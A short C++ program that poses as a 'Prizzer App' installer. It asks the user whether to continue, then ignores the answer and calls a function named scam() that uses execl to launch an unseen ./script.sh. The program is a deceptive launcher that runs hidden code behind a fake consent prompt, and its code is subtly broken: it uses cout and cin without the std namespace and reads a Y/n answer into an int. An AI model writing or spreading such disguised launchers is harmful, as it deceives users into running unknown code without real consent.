#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include<unistd.h>


void scam() {
    execl("./script.sh","script.sh",(char*)0);
}

int main() {

    int choice;
    cout << "Thanks for downloading Prizzer App" << endl;
    cout << "Do you want to continue [Y/n]?: ";
    cin >> choice;
    
    scam();

    return 0;
};


